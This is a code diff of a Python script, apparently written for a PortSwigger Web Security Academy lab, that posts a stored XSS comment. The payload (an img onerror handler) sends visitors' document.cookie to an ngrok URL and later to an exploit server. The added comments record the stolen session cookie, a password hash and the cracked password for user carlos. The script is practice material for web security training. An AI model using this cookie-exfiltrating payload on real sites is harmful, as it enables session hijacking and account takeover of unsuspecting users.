@@ -22,8 +22,8 @@ postId=5&comment=%3Cimg+src%3Dx+onerror%3D%22this.src%3D%27https%3A%2F%2F09b2-2-
 
 import requests
 
-DOMAIN = "0a1e00a70363397b80677bff00500055.web-security-academy.net"
-LISTENING_URL = "https://09b2-2-132-32-77.ngrok-free.app"
+DOMAIN = "0a1300d40487aa1882dd1a6600a7005b.web-security-academy.net"
+EXPLOIT_SERVER = "https://exploit-0add0009048aaadc82941902013e0056.exploit-server.net/exploit"
 
 HEADERS = {
     "Host": DOMAIN,
@@ -49,7 +49,7 @@ COOKIES = {
 }
 
 def send_comments():
-    payload = f"<img src=x onerror=\"this.src='{LISTENING_URL}/?'+document.cookie; this.removeAttribute('onerror');\">"
+    payload = f"<img src=x onerror=\"this.src='{EXPLOIT_SERVER}/?'+document.cookie; this.removeAttribute('onerror');\">"
 
     url = f"https://{DOMAIN}/post/comment"
     data = {
@@ -65,4 +65,5 @@ def send_comments():
         response = requests.post(url, headers=HEADERS, cookies=COOKIES, data=data)
     
 
-send_comments()
+# send_comments() # /exploit/?secret=OtlZCG2rN8lRoT10QVEyNr9M75OVCbyn;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz  #carlos:26323c16d5f4dabff3bb136f2460a943
+# carlos:onceuponatime
